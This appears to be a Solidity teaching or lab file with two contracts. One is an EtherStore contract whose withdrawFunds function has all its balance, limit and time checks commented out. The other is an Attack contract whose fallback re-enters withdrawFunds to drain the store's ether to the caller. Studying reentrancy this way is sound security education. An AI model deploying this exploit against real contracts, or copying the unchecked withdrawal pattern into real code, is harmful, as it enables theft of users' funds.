// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        // require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        // require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        // require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        (bool sent,) = msg.sender.call{value:_weiToWithdraw}("");
        require(sent);
        // balances[msg.sender] -= _weiToWithdraw;
        // lastWithdrawTime[msg.sender] = now;
    }

    function getBalance() public view returns (uint){
        return address(this).balance;

    }
 }

 contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress)  {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
    //   require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
    //   etherStore.depositFunds{value:1 ether}();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      payable(msg.sender).transfer(address(this).balance);
  }

    event showinfo(string info);
  // fallback function - where the magic happens
  fallback() external  payable {
      if (address(etherStore).balance >= 1 ether) {
          emit showinfo("fallback");
          etherStore.withdrawFunds(1 ether);
      }
  }

//    receive() external payable {
//     //   revert();
//       if (address(etherStore).balance >= 1 ether) {
//           emit showinfo("receive");
//           etherStore.withdrawFunds(1 ether);
//       }
      
//   }
  function getBalance() public view returns (uint){
        return address(this).balance;

    }
}